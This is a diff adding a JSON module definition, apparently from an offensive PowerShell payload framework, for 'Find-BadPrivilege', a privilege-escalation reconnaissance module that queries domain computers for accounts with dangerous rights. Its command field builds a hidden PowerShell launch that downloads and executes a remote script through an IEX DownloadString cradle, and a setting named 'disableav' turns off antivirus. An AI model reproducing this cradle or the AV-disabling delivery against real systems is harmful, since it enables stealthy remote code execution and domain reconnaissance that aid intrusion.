@@ -1,0 +1,40 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Find-BadPrivilege",
+    "author": ["Tobias Mccurry (@lordsaibat)", "Tony Pombo"],
+    "path": ["windows", "x64", "powershell", "privesc", "Find-BadPrivilege.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": true,
+    "notes": "Based on code from Tony Pombo https://gallery.technet.microsoft.com/scriptcenter/Grant-Revoke-Query-user-26e259b0\r\n\r\nThe Active Directory commandlet must be installed. Using the commandlet, a list of computers will be pulled from Active Directory. Using that list, each computer will then be queried for its privileged users. If the Active Directory commandlet is not installed visit: https://blogs.technet.microsoft.com/ashleymcglone/2016/02/26/install-the-active-directory-powershell-module-on-windows-10/",
+    "remote": "https://raw.githubusercontent.com/lordsaibat/finding_windows_privileges/master/Find-BadPrivileges-DomainComputers.ps1",
+    "local": ["data", "src", "lordsaibat", "Find-BadPrivileges-DomainComputers.ps1"],
+    "options": [
+      {"name": "AccountNameOnly", "value": null, "required": false, "flag": "-AccountNameOnly", "description":"[Switch]Show the account name only"},
+      {"name": "OU", "value": null, "required": false, "flag": "-OU", "description":"Lists the User accounts in an OU with the bad privileges enabled"},
+      {"name": "Group", "value": "", "required": false, "flag": "-Group", "description":"Lists the User accounts in a Group with the bad privileges enabled"},
+      {"name": "ComputerName", "value": "localhost", "required": false, "flag": "-ComputerName", "description":"List the User accounts on a remote test with bad privileges enabled"}
+    ],
+    "description": "Retrieves a list of all the user rights (privileges) granted to one or more accounts. The rights retrieved are those granted directly to the user account, and does not include those rights obtained as part of membership to a group.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w",
+      "0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/lordsaibat/finding_windows_privileges/master/Find-BadPrivileges-DomainComputers.ps1');",
+      "Find-BadPrivileges",
+      "{{ComputerName}}",
+      "{{AccountNameOnly.Flag}}",
+      "{{OU}} ",
+      "{{Group}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
